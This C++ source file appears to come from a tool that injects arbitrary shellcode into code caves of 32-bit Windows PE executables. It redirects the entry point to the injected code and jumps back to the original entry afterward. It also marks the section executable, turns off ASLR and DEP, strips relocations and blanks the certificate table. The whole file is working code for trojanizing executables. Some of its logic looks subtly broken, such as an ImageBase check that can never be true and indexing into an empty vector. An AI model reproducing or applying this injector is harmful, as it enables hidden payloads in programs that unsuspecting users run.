#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <memory>
#include "PE.h"
#include <bitset>
#include <sstream>
using namespace std;

namespace PE
{
	void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
	{
		this->size_ids = size_ids_;
		this->size_dos_stub = size_dos_stub_;
		this->size_inh32 = size_inh32_;
		this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
		this->size_sections = size_sections_;
	}

	tuple<bool, char*, streampos> OpenBinary(string filename)
	{
		auto flag = false;
		fstream::pos_type size{};
		char* bin{};


		ifstream ifile(filename, ios::binary | ios::in | ios::ate);
		if (ifile.is_open())
		{
			size = ifile.tellg();
			bin = new char[size];
			ifile.seekg(0, ios::beg);
			ifile.read(bin, size);
			ifile.close();
			flag = true;
		}
		return make_tuple(flag, bin, size);
	}

	unique_ptr<PE_FILE> ParsePE(const char* PE)
	{
		auto pefile = make_unique<PE_FILE>();
		memcpy_s(&(*pefile).ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
		memcpy_s(&(*pefile).inh32, sizeof(IMAGE_NT_HEADERS32), PE + (*pefile).ids.e_lfanew, sizeof(IMAGE_NT_HEADERS32)); // address of PE header = e_lfanew
		size_t stub_size = (*pefile).ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
		pefile.get()->MS_DOS_STUB = shared_ptr<char>(new char[stub_size]);
		memcpy_s(pefile.get()->MS_DOS_STUB.get(), stub_size, (PE + 0x3c + 0x4), stub_size);
		if ((*pefile).inh32.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		{
			std::cout << "Please, only 32-bit PE :)\n";
			getchar();
			exit(1);
		}
		auto number_of_sections = pefile.get()->inh32.FileHeader.NumberOfSections;
		pefile.get()->ish = shared_ptr<IMAGE_SECTION_HEADER>{ new IMAGE_SECTION_HEADER[number_of_sections + 1]{} }; // Number of sections

		auto PE_Header = PE + (*pefile).ids.e_lfanew;
		auto First_Section_Header = PE_Header + 0x18 + (*pefile).inh32.FileHeader.SizeOfOptionalHeader; // First Section: PE_header + sizeof FileHeader + sizeof Optional Header

																										// copy section headers
		for (auto i = 0; i < pefile.get()->inh32.FileHeader.NumberOfSections; ++i)
		{
			memcpy_s(&(*pefile).ish.get()[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
		}

		for (auto i = 0; i < (*pefile).inh32.FileHeader.NumberOfSections; ++i)
		{
			auto t_char = make_unique<char*>(new char[(*pefile).ish.get()[i].SizeOfRawData]{}); // Section
			memcpy_s(*t_char, (*pefile).ish.get()[i].SizeOfRawData, PE + (*pefile).ish.get()[i].PointerToRawData, (*pefile).ish.get()[i].SizeOfRawData); // copy sections.
			pefile->Sections.push_back(make_pair(make_shared<char*>(*t_char), (*pefile).ish.get()[i].SizeOfRawData));
			t_char.reset();
		}
		size_t sections_size{};
		for (WORD i = 0; i < pefile.get()->inh32.FileHeader.NumberOfSections; ++i)
		{
			sections_size += pefile.get()->ish.get()[i].SizeOfRawData;
		}

		pefile->set_sizes(sizeof(pefile.get()->ids), stub_size, sizeof(pefile.get()->inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

		return pefile;
	}

	void WriteBinary(PE_FILE pefile, std::string file_name, size_t size)
	{
		// TODO: recompute checksum value
		pefile.inh32.OptionalHeader.CheckSum = 0;

		auto r_ch = new char[size] {};

		memcpy_s(r_ch, pefile.size_ids, &pefile.ids, pefile.size_ids);
		memcpy_s(r_ch + pefile.size_ids, pefile.size_dos_stub, pefile.MS_DOS_STUB.get(), pefile.size_dos_stub);
		memcpy_s(r_ch + pefile.size_ids + pefile.size_dos_stub, pefile.size_inh32, &pefile.inh32, pefile.size_inh32);

		for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections + 1; ++i)
		{
			memcpy_s(r_ch + pefile.size_ids + pefile.size_dos_stub + pefile.size_inh32 + i * sizeof(IMAGE_SECTION_HEADER), sizeof(IMAGE_SECTION_HEADER), &pefile.ish.get()[i], sizeof(IMAGE_SECTION_HEADER));
		}


		for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
		{
			memcpy_s(&r_ch[pefile.ish.get()[i].PointerToRawData], pefile.ish.get()[i].SizeOfRawData, *pefile.Sections[i].first.get(), pefile.ish.get()[i].SizeOfRawData);
		}

		ofstream ofile(file_name, ios::binary | ios::out);
		ofile.write(r_ch, size);
		std::cout << "\nEOF\n" << endl;
		ofile.close();
	}

	void Inject_into_Largest_Tail(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
	{
		auto Parsed_PE = ParsePE(pe_file);

		if (Parsed_PE.get()->ids.e_magic != IMAGE_DOS_SIGNATURE)
		{
			std::cout << "Sorry, I only can handle executable files :/\n";
			exit(1);
		}

		if (Parsed_PE.get()->inh32.FileHeader.Characteristics & IMAGE_FILE_DLL)
		{
			std::cout << "Sorry, I can not handle dll files :/\n";
			exit(1);
		}

		if (Parsed_PE.get()->inh32.OptionalHeader.ImageBase < 0x400000 && Parsed_PE.get()->inh32.OptionalHeader.ImageBase > 0x1000000)
		{
			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
			exit(1);
		}

		vector<WORD> good_sections_r_sz;
		vector<WORD> good_sections_v_sz;
		for (WORD i = 0; i < Parsed_PE.get()->inh32.FileHeader.NumberOfSections; ++i)
		{
			if (Parsed_PE.get()->ish.get()[i].SizeOfRawData > Parsed_PE.get()->ish.get()[i].Misc.VirtualSize) // r_sz > v_sz
				good_sections_r_sz.push_back(i);
			else
				good_sections_v_sz.push_back(i); // r_sz <= v_sz
		}

		for (size_t i = 0; i < good_sections_r_sz.size(); ++i) // If r_sz � v_sz >= FA, probably contains an overlay
		{
			if (Parsed_PE.get()->ish.get()[i].SizeOfRawData - Parsed_PE.get()->ish.get()[i].Misc.VirtualSize >= Parsed_PE.get()->inh32.OptionalHeader.FileAlignment)
				good_sections_r_sz.erase(good_sections_r_sz.begin() + i);
		}
		// size of area <= FA (0x200) in good_sections_r_sz

		// check for zeros - good_sections_r_sz
		auto ready_sections_r_sz{ good_sections_r_sz }; // amount of available free space == Parsed_PE.get()->ish[i].SizeOfRawData - Parsed_PE.get()->ish[i].Misc.VirtualSize
		for (size_t i = 0; i < good_sections_r_sz.size(); ++i)
		{
			auto size_zeros = Parsed_PE.get()->ish.get()[good_sections_r_sz[i]].SizeOfRawData - Parsed_PE.get()->ish.get()[good_sections_r_sz[i]].Misc.VirtualSize;
			auto section = *Parsed_PE.get()->Sections[good_sections_r_sz[i]].first.get();

			for (DWORD j = 0; j < size_zeros; ++j)
			{
				if (section[Parsed_PE.get()->ish.get()[good_sections_r_sz[i]].Misc.VirtualSize + j] != 0x0)
				{
					ready_sections_r_sz.erase(ready_sections_r_sz.begin() + i);
					break;
				}
			}
		}

		// zeros for good_sections_v_sz
		vector<tuple<WORD, size_t, size_t>> section_index_size_v_sz{}; // size of zeros and index of start point
		for (auto &n : good_sections_v_sz)
		{
			auto section = *Parsed_PE.get()->Sections[n].first.get();
			auto section_size = Parsed_PE.get()->ish.get()[n].SizeOfRawData;
			tuple<WORD, size_t, size_t> section_index_size{};
			for (DWORD i = 0; i < section_size; ++i)
			{
				if (section[i] == 0x0)
				{
					get<2>(section_index_size)++;
					if (get<2>(section_index_size) == 1)
						get<1>(section_index_size) = i;
				}
				else
				{
					get<2>(section_index_size) = { 0 };
				}

			}
			get<0>(section_index_size) = n;
			section_index_size_v_sz.push_back(section_index_size);
		}


		// section with the largest amount of available free space r_sz
		std::sort(good_sections_r_sz.begin(), good_sections_r_sz.end(), [&](int a, int b) {
			return Parsed_PE.get()->ish.get()[a].SizeOfRawData - Parsed_PE.get()->ish.get()[a].Misc.VirtualSize > Parsed_PE.get()->ish.get()[b].SizeOfRawData - Parsed_PE.get()->ish.get()[b].Misc.VirtualSize;
		});

		// section with the largest amount of available free space v_sz
		std::sort(section_index_size_v_sz.begin(), section_index_size_v_sz.end(), [&](auto a, auto b)
		{
			return get<2>(a) > get<2>(b);
		});

		// section with largest amount of available free space.
		tuple<WORD, size_t, size_t> ready_section_index_size{};
		if (good_sections_v_sz.empty() && good_sections_r_sz.empty())
			exit(1);
		if (good_sections_r_sz.empty() && !good_sections_v_sz.empty())
			ready_section_index_size = tuple<WORD, size_t, size_t>{ get<0>(section_index_size_v_sz[0]), get<1>(section_index_size_v_sz[0]), get<2>(section_index_size_v_sz[0]) };
		else if (!good_sections_v_sz.empty() && good_sections_r_sz.empty())
			ready_section_index_size = tuple<WORD, size_t, size_t>{ good_sections_r_sz[0], Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].Misc.VirtualSize, Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].SizeOfRawData - Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].Misc.VirtualSize };
		else {
			if (Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].SizeOfRawData - Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].Misc.VirtualSize > get<2>(section_index_size_v_sz[0]))
				ready_section_index_size = tuple<WORD, size_t, size_t>{ good_sections_r_sz[0], Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].Misc.VirtualSize, Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].SizeOfRawData - Parsed_PE.get()->ish.get()[good_sections_r_sz[0]].Misc.VirtualSize };
			else
				ready_section_index_size = tuple<WORD, size_t, size_t>{ get<0>(section_index_size_v_sz[0]), get<1>(section_index_size_v_sz[0]), get<2>(section_index_size_v_sz[0]) };
		}
		// just for safety :)
		if (get<2>(ready_section_index_size) > 0x16)
			get<1>(ready_section_index_size) += 0x16;
		else
		{
			get<2>(ready_section_index_size) = { 0 };
			exit(1); // not enough free space;
		}

		// check and correct characteristics
		WORD section = get<0>(ready_section_index_size);
		DWORD characteristics = Parsed_PE.get()->ish.get()[section].Characteristics;

		if (characteristics & IMAGE_SCN_MEM_SHARED)
			characteristics ^= IMAGE_SCN_MEM_SHARED;  // remove
		if (characteristics & IMAGE_SCN_MEM_DISCARDABLE)
			characteristics ^= IMAGE_SCN_MEM_DISCARDABLE;
		if (!(characteristics & IMAGE_SCN_MEM_EXECUTE))
			characteristics |= IMAGE_SCN_MEM_EXECUTE;  // set
		if (!(characteristics & IMAGE_SCN_CNT_CODE))
			characteristics |= IMAGE_SCN_CNT_INITIALIZED_DATA;

		Parsed_PE.get()->ish.get()[section].Characteristics = characteristics;

		auto section_ = section;
		auto index_ = get<1>(ready_section_index_size);
		auto size_ = get<2>(ready_section_index_size);

		auto imagebase = Parsed_PE.get()->inh32.OptionalHeader.ImageBase;
		auto OEP = Parsed_PE.get()->inh32.OptionalHeader.AddressOfEntryPoint;
		auto image_base_OEP = imagebase + OEP;
		char push[] = "\x68"; // push
		char esp[] = "\xff\x24\x24"; // jmp [esp]
		char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP

		auto AEP = index_ + Parsed_PE.get()->ish.get()[section_].VirtualAddress;
		Parsed_PE.get()->inh32.OptionalHeader.AddressOfEntryPoint = AEP;

		auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4;
		if (inj_size < size_) {
			auto inj_section = *Parsed_PE.get()->Sections[section_].first.get();
			memcpy(&inj_section[index_], xcode, size_of_xcode - 1);
			memcpy(&inj_section[index_ + size_of_xcode - 1], push, sizeof push);
			memcpy(&inj_section[index_ + size_of_xcode + sizeof push - 2], hex_oep, sizeof hex_oep);
			memcpy(&inj_section[index_ + sizeof hex_oep + sizeof push + size_of_xcode - 2], esp, sizeof esp);
		}
		else {
			std::cout << "Sorry, there is no enough space :/\n";
			exit(1);
		}

		// disable ASLR
		Parsed_PE.get()->inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
		Parsed_PE.get()->inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

		// disable DEP
		Parsed_PE.get()->inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

		// zeroize CERTIFICATE table's offset and size
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[4].Size = { 0 };

		// If v_sz != 0 and v_sz < r_sz, increase v_sz by sizeof(xcode).
		if (Parsed_PE.get()->ish.get()[section].SizeOfRawData > Parsed_PE.get()->ish.get()[section].Misc.VirtualSize && Parsed_PE.get()->ish.get()[section].Misc.VirtualSize != 0)
			Parsed_PE.get()->ish.get()[section].Misc.VirtualSize += inj_size + 0x17;  // just enough


		auto size_of_changed_pe = size_of_pe;

		WriteBinary(*Parsed_PE.get(), out_path, size_of_changed_pe);

	}

	void Inject_into_code_tail(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
	{
		auto is_valid = true;
		auto Parsed_PE = ParsePE(pe_file);

		if (Parsed_PE.get()->ids.e_magic != IMAGE_DOS_SIGNATURE)
			exit(1); // If not MZ

		if (Parsed_PE.get()->inh32.OptionalHeader.ImageBase < 0x400000 && Parsed_PE.get()->inh32.OptionalHeader.ImageBase > 0x1000000)
		{
			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
			exit(1);
		}

		tuple<WORD, size_t, size_t> ready_section_index_size{};
		WORD code_section{};
		for (WORD i = 0; i < Parsed_PE.get()->inh32.FileHeader.NumberOfSections; ++i)
		{
			if (Parsed_PE.get()->ish.get()[i].Characteristics & IMAGE_SCN_CNT_CODE)
			{
				code_section = { i };
				break;
			}
		}

		auto r_sz = Parsed_PE.get()->ish.get()[code_section].SizeOfRawData > Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize;
		if (r_sz) {
			is_valid = Parsed_PE.get()->ish.get()[code_section].SizeOfRawData - Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize < Parsed_PE.get()->inh32.OptionalHeader.FileAlignment;

			auto size_zeros = Parsed_PE.get()->ish.get()[code_section].SizeOfRawData - Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize;
			auto section = *Parsed_PE.get()->Sections[code_section].first.get();

			for (DWORD j = 0; j < size_zeros; ++j)
			{
				if (section[Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize + j] != 0x0)
				{
					std::cout << "Sorry, there is no enough space in code section :/\n";
					exit(1);
				}
			}

			ready_section_index_size = tuple<WORD, size_t, size_t>{ code_section, Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize, Parsed_PE.get()->ish.get()[code_section].SizeOfRawData - Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize };

		}
		else
		{
			// v_sz
			tuple<WORD, size_t, size_t > section_index_size_v_sz{};
			auto section = *Parsed_PE.get()->Sections[code_section].first.get();
			auto section_size = Parsed_PE.get()->ish.get()[code_section].SizeOfRawData;
			tuple<WORD, size_t, size_t> section_index_size{};
			for (DWORD i = 0; i < section_size; ++i)
			{
				if (section[i] == 0x0)
				{
					get<2>(section_index_size)++;
					if (get<2>(section_index_size) == 1)
						get<1>(section_index_size) = i;
				}
				else
				{
					get<2>(section_index_size) = { 0 };
				}

			}
			get<0>(section_index_size) = code_section;
			if (get<2>(section_index_size) == 0)
			{
				std::cout << "I can not inject code into code section :/\n";
				exit(1);
			}

			ready_section_index_size = tuple<WORD, size_t, size_t>{ get<0>(section_index_size), get<1>(section_index_size), get<2>(section_index_size) };

		}

		if (get<2>(ready_section_index_size) > 0x16)
			get<1>(ready_section_index_size) += 0x16;
		else
		{
			get<2>(ready_section_index_size) = { 0 };
			exit(1); // not enough free space;
		}

		auto section_ = code_section;
		auto index_ = get<1>(ready_section_index_size);
		auto size_ = get<2>(ready_section_index_size);

		auto imagebase = Parsed_PE.get()->inh32.OptionalHeader.ImageBase;
		auto OEP = Parsed_PE.get()->inh32.OptionalHeader.AddressOfEntryPoint;
		auto image_base_OEP = imagebase + OEP;
		char push[] = "\x68"; // push
		char esp[] = "\xff\x24\x24"; // jmp [esp]
		char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP

		auto AEP = index_ + Parsed_PE.get()->ish.get()[section_].VirtualAddress;
		Parsed_PE.get()->inh32.OptionalHeader.AddressOfEntryPoint = AEP;

		auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4;
		if (inj_size < size_) {
			auto inj_section = *Parsed_PE.get()->Sections[section_].first.get();
			memcpy(&inj_section[index_], xcode, size_of_xcode - 1);
			memcpy(&inj_section[index_ + size_of_xcode - 1], push, sizeof push);
			memcpy(&inj_section[index_ + size_of_xcode + sizeof push - 2], hex_oep, sizeof hex_oep);
			memcpy(&inj_section[index_ + sizeof hex_oep + sizeof push + size_of_xcode - 2], esp, sizeof esp);
		}
		else {
			std::cout << "Sorry, there is no enough space in the code section :/\n";
			exit(1);
		}

		// disable ASLR
		Parsed_PE.get()->inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
		Parsed_PE.get()->inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

		// disable DEP
		Parsed_PE.get()->inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

		// zeroize CERTIFICATE table's offset and size
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[4].Size = { 0 };

		// If v_sz != 0 and v_sz < r_sz, increase v_sz by sizeof(xcode).
		if (Parsed_PE.get()->ish.get()[code_section].SizeOfRawData > Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize && Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize != 0)
			Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize += inj_size + 0x17;  // just enough


		auto size_of_changed_pe = size_of_pe;

		WriteBinary(*Parsed_PE.get(), out_path, size_of_changed_pe);
	}
}